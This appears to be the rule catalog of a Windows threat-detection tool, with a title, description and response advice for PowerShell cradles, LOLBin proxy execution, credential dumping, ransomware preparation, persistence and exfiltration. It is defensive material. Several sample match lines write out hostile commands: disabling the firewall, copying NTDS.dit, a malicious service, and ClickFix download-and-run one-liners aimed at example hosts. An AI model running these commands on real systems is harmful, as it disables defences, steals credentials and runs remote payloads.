rules.title: PowerShell with an encoded command
rules.description: PowerShell was given a Base64-encoded command, which hides what it runs. Common in malware launchers and droppers.
rules.recommendation: Decode the Base64 (UTF-16LE) to see the real command. Check the parent process and how it was started.

rules.title: PowerShell download-and-run cradle
rules.description: PowerShell downloads code from the network and executes it in memory without saving a file — a classic first-stage loader.
rules.recommendation: Identify the URL, fetch it safely in a sandbox, and block the domain/IP. Look for what ran next (child processes, new connections).

rules.title: PowerShell launched hidden with policy bypass
rules.description: Hidden window plus execution-policy bypass or no profile is typical of scripted attacks, though some admin tools do this too.
rules.recommendation: Check the script or command being run, and whether the parent (e.g. Office, browser, scheduled task) is expected.

rules.title: AMSI / script-scanning bypass attempt
rules.description: A command tried to disable the Antimalware Scan Interface so malicious scripts aren't scanned. Legitimate software essentially never does this.
rules.recommendation: Treat the host as compromised. Capture the full script (event 4104), isolate the machine and look for follow-on activity.

rules.title: In-memory .NET assembly loading
rules.description: PowerShell loads a .NET assembly straight from memory (often Base64), a common way to run tools like loaders and post-exploitation kits without touching disk.
rules.recommendation: Recover the Base64 blob from the command or event 4104 and analyze it in a sandbox.

rules.title: Microsoft Defender disabled or excluded from the command line
rules.description: Antivirus protection was turned off or a folder/process was excluded from scanning — attackers do this right before dropping payloads.
rules.recommendation: Re-enable protection, remove unexpected exclusions (Get-MpPreference) and scan the excluded locations.

rules.title: mshta running remote or inline script
rules.description: mshta.exe executed an HTA file or inline script. It is heavily abused for initial access (including fake-CAPTCHA “ClickFix” lures) and rarely used legitimately.
rules.recommendation: Find where the URL/file came from (browser history, email, RunMRU), block it, and check for payloads it dropped.

rules.title: Windows Script Host running a script from a user folder
rules.description: A JScript/VBScript file ran from a user-writable folder — the usual path for malicious email and download attachments.
rules.recommendation: Collect the script, check how it arrived (email/download), and look for child processes it started.

rules.title: certutil used to download a file
rules.description: certutil.exe fetched a file from the network. Attackers use it as a built-in downloader.
rules.recommendation: Find and hash the downloaded file, check it against threat intelligence, and block the source.

rules.title: certutil used to decode a file
rules.description: certutil.exe decoded a Base64/hex file — often used to unpack a payload smuggled as text.
rules.recommendation: Inspect the input and output files named in the command line.

rules.title: bitsadmin download or command job
rules.description: BITS was used to download a file or run a command when a job completes — a stealthy persistence and download method.
rules.recommendation: List BITS jobs (Get-BitsTransfer -AllUsers) and investigate the URL and notify command.

rules.title: curl downloading from a raw IP address
rules.description: curl.exe fetched content from a bare IP address rather than a named site — common for attacker staging servers.
rules.recommendation: Look up the IP's reputation and check what was saved (-o) and executed afterwards.

rules.title: finger.exe used to fetch commands
rules.description: finger.exe queried a remote host. It has almost no modern legitimate use and is abused in ClickFix campaigns to pull down the next command.
rules.recommendation: Block the remote host and check RunMRU/clipboard-driven executions on this machine.

rules.title: regsvr32 loading a remote scriptlet (Squiblydoo)
rules.description: regsvr32 executed a scriptlet from a URL or via scrobj.dll — a well-known application-control bypass.
rules.recommendation: Retrieve the scriptlet URL, block it, and review child processes.

rules.title: regsvr32 registering a DLL from a user folder
rules.description: regsvr32 loaded a DLL from a user-writable folder — a frequent way to execute malicious DLLs.
rules.recommendation: Hash the DLL and check its signature and origin.

rules.title: rundll32 running script or a URL handler
rules.description: rundll32 was used to run script or launch another program through a Windows DLL export — common proxy-execution tricks.
rules.recommendation: Look at the full command line and the process it launched.

rules.title: rundll32 loading a DLL from a user folder
rules.description: rundll32 executed code from a user-writable folder (sometimes disguised with a non-DLL extension) — typical of loaders like those used by banking trojans and ransomware precursors.
rules.recommendation: Hash and submit the DLL for analysis; check persistence entries that reference it.

rules.title: LSASS memory dump via comsvcs.dll
rules.description: A process memory dump was requested through comsvcs.dll MiniDump — the standard living-off-the-land way to steal credentials from LSASS.
rules.recommendation: Assume credentials on this host are compromised: isolate it, reset passwords for accounts that logged on, and find the dump file.

rules.title: msiexec installing a package from a URL
rules.description: msiexec installed an MSI directly from the internet, a common malware delivery method.
rules.recommendation: Identify the MSI source and what it installed (Programs and Features, new services, new files).

rules.title: InstallUtil used to run code
rules.description: InstallUtil can execute arbitrary .NET code and is used to bypass application allow-listing.
rules.recommendation: Inspect the assembly passed to InstallUtil.

rules.title: RegAsm/RegSvcs loading an assembly from a user folder
rules.description: RegAsm/RegSvcs ran a .NET assembly from a user-writable folder — a known allow-listing bypass.
rules.recommendation: Hash and analyze the assembly.

rules.title: CMSTP used to run an INF file
rules.description: cmstp.exe executed an INF profile silently — used to bypass UAC and allow-listing.
rules.recommendation: Review the INF file's RunPreSetupCommands section.

rules.title: odbcconf registering a DLL
rules.description: odbcconf was used to load a DLL — a rarely legitimate proxy-execution technique.
rules.recommendation: Identify and analyze the referenced DLL.

rules.title: Compiled HTML Help opened from the internet
rules.description: hh.exe opened a CHM help file from the internet or a user folder; malicious CHM files can run script.
rules.recommendation: Collect the CHM and check how it arrived.

rules.title: Indirect command execution (forfiles / pcalua / conhost)
rules.description: A built-in tool was used to launch another program indirectly, which can evade simple parent-child monitoring.
rules.recommendation: Look at the program that was launched.

rules.title: Volume shadow copies deleted or shrunk
rules.description: Backups that Windows keeps for recovery were deleted. This is one of the most reliable signs of ransomware about to encrypt, or already encrypting.
rules.recommendation: Isolate the host from the network now. Check other hosts for the same command and preserve evidence before rebooting.

rules.title: Backup catalog or boot recovery disabled
rules.description: Windows backups or automatic recovery were disabled — a standard ransomware preparation step.
rules.recommendation: Isolate the host and hunt for encryption activity and the same commands on other machines.

rules.title: Event logs cleared from the command line
rules.description: Windows event logs were cleared — attackers do this to erase evidence of what they did.
rules.recommendation: Collect any logs that remain (including forwarded copies/SIEM) and identify who ran the command.

rules.title: Firewall disabled or a port proxy added
rules.description: The Windows firewall was turned off, or a port-forwarding proxy was created to tunnel traffic through this host.
rules.recommendation: Re-enable the firewall and remove unexpected port proxies (netsh interface portproxy show all).

match: netsh advfirewall set allprofiles state off
netsh interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.5 connectport=3389

rules.title: Registry hives with password hashes saved to disk
rules.description: The SAM, SYSTEM or SECURITY hive was copied out. Together they let an attacker extract local password hashes offline.
rules.recommendation: Find and remove the saved hive files, assume local account hashes are exposed, and rotate local admin passwords (e.g. Windows LAPS).

rules.title: Active Directory database copy (NTDS.dit)
rules.description: An attempt to copy the Active Directory database, which contains password hashes for every domain account.
rules.recommendation: Treat the domain as compromised: involve your incident response process, and plan a krbtgt and privileged-account reset.

match: ntdsutil "ac i ntds" "ifm" "create full c:\temp\x" q q

rules.title: Scheduled task created to run a script host or user-folder binary
rules.description: A scheduled task was created that runs a script interpreter or a program from a user-writable folder — a common persistence method.
rules.recommendation: Review the task (schtasks /query /tn NAME /v /fo list) and its action.

rules.title: Service created to run a script host or user-folder binary
rules.description: A Windows service was set to run a script interpreter or a program from a user-writable folder — used for persistence and privilege escalation.
rules.recommendation: Inspect and remove the service if it is not legitimate (sc qc NAME).

match: sc create upd binPath= "cmd /c C:\Users\Public\x.exe" start= auto

rules.title: Run key added from the command line
rules.description: A program was registered to start automatically at logon via a Run key.
rules.recommendation: Check the value that was added and whether the program is expected.

rules.title: Account added to the local Administrators group
rules.description: An account was given local administrator (or RDP) rights from the command line.
rules.recommendation: Confirm the change was authorized; remove the membership if not and review the account's activity.

rules.title: Local account created from the command line
rules.description: A new local account was created from the command line.
rules.recommendation: Verify the account is expected.

rules.title: Domain / privileged-group reconnaissance
rules.description: Commands that list domain trusts or privileged groups. Normal for admins, but a common early step in hands-on-keyboard intrusions.
rules.recommendation: Check who ran it and whether it clusters with other suspicious activity.

rules.title: WMIC remote or process-create execution
rules.description: WMIC created a process, possibly on another machine — used for lateral movement and execution.
rules.recommendation: Identify the target and the command executed.

rules.title: PsExec-style remote service execution
rules.description: PsExec or a clone ran a command remotely. Admins use it, but so do ransomware operators to push payloads across a network.
rules.recommendation: Confirm the operator and target were expected.

rules.title: Heavily obfuscated cmd.exe command
rules.description: The command line is deliberately obfuscated (caret insertion or substring tricks) to dodge detection.
rules.recommendation: Deobfuscate the command (remove carets, resolve the variables) and investigate what it runs.

rules.title: Pasted one-liner that downloads and runs (ClickFix / fake CAPTCHA)
rules.description: A command containing a download plus ‘verification’ wording, typical of fake CAPTCHA / ClickFix pages that trick users into pasting commands into the Run box.
rules.recommendation: Ask the user what website they were on, block it, and check what the command downloaded and ran.

match: powershell -w h -c "iwr https://check.example/v | iex" # I am not a robot - Cloudflare Verification ID: 2291
mshta https://cdn.example/x # ✅ Verify you are human Ray ID: 88f2

rules.title: rclone copying data to cloud storage
rules.description: rclone transferred files to a cloud remote. Ransomware gangs routinely use it to steal data before encrypting.
rules.recommendation: Identify the remote (rclone config file), the data copied, and block the destination.

rules.title: SSH/plink reverse tunnel
rules.description: An SSH reverse or dynamic tunnel was opened, which can expose internal services (like RDP) to an outside host.
rules.recommendation: Identify the remote host and close the tunnel if unauthorized.
